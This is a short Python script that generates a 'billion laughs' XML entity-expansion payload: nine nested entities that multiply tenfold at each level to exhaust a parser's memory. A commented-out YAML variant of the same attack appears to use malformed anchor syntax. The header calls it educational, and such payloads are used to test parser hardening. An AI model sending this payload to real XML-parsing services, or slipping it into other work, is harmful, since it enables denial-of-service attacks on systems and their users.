#!/usr/bin/env python
"""
generate_bla.py
:author: Andrew Scott
:date: 2/1/2020

THIS SCRIPT IS FOR EDUCATIONAL PURPOSES ONLY!
"""

def generate_xml():
    base_xml_doc = '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)>%s]><lolz>&lol9;</lolz>'

    def generate_line(start):
        sub = f"&lol{start-1};" if start > 1 else "&lol;"
        return f'<!ENTITY lol{start} "{sub*10}">'
    
    return base_xml_doc % "".join([generate_line(i) for i in range(1,10)])

# def generate_yaml():

#     def generate_line(start):
#         sub = f"*{chr(start-1)}" if start > 97 else "lol"
#         return f"{chr(start)}: {chr(start)}& {[sub]*10}\n"

#     return "".join([generate_line(i) for i in range(97,106)])
